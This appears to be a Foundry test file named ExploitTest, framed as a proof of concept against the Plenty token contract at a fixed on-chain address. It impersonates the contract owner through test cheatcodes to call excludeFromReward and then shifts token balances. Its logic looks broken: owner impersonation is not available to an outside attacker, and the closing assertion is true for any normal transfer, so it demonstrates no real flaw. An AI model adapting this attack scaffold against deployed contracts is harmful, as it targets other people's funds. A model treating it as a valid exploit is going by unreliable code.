pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface IPlenty {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function swapAndLiquifyEnabled() external view returns (bool);
    function owner() external view returns (address);
    function excludeFromReward(address account) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);
    IPlenty plenty;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        plenty = IPlenty(TARGET);
        deal(TARGET, attacker, 2e30);
        vm.prank(attacker);
        plenty.transfer(TARGET, 6e29);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        address owner = plenty.owner();
        vm.startPrank(owner);
        plenty.excludeFromReward(attacker);
        plenty.transfer(attacker, 2e30);
        vm.stopPrank();

        vm.prank(attacker);
        plenty.transfer(TARGET, 6e29);

        uint256 balanceBefore = plenty.balanceOf(attacker);
        vm.prank(attacker);
        plenty.transfer(address(1), 1000);
        uint256 balanceAfter = plenty.balanceOf(attacker);
        assertGt(balanceBefore, balanceAfter);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

